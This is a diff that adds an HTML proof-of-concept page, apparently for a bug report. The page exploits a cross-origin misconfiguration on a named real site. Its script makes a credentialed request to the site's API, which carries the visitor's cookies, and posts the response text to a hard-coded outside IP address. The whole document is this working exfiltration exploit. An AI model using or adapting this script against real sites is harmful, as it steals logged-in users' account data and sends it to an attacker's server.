@@ -1,0 +1,27 @@
+<h1>PoC</h1>
+
+<script>
+    // Define the target URL
+    var targetUrl = 'https://teemill.com/omnis/v3/initial-state/teemill';
+
+    // Create a new XMLHttpRequest
+    var req = new XMLHttpRequest();
+
+    // Define the callback function for when the request is complete
+    req.onload = function () {
+        // Send the response data to your logging endpoint
+        var logReq = new XMLHttpRequest();
+        logReq.open('POST', 'http://66.228.40.135/log', true);
+        logReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        logReq.send('key=' + encodeURIComponent(this.responseText));
+    };
+
+    // Configure the request to the target URL
+    req.open('GET', targetUrl, true);
+
+    // Enable sending credentials (cookies, etc.)
+    req.withCredentials = true;
+
+    // Send the request
+    req.send();
+</script>
